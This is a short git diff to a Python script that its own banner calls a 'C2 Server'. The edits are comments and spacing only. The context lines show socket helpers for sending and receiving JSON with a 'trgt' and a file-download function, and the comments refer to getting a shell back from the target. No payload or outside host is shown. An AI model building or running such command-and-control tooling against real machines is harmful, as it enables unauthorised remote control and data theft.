@@ -3,18 +3,21 @@
 import socket
 from termcolor import colored  # python coloring library
 import time
-import os                      # Library can be used to change directory by the C2 server owner, after getting a shell back from trgt
+import os                      # Library provides a portable way of using operating system-dependent functionality
+			       # which can be used by the C2 server owner, after getting a shell back from trgt
 
 import json                    # The process of encoding JSON is usually called serialization.
                                # This term refers to the transformation of data into a series of bytes (hence serial) to be stored or transmitted across a network.
 
 import pyfiglet                # python library to print ASCII art fonts
 
+
 # Sending whole data all at once
 def send_eff(data):
 
 	json_data = json.dumps(data)
 	trgt.send(json_data.encode('utf-8'))          # encoding data to bytes
+
 
 # Receiving whole data all at once
 def recv_eff():
@@ -71,7 +74,7 @@ def download_file(file_name):
 	trgt.settimeout(None)
 	file.close()
 
-
+# Banner
 def banner():
 
 	bann = pyfiglet.figlet_format("C2 Server", font = "slant")
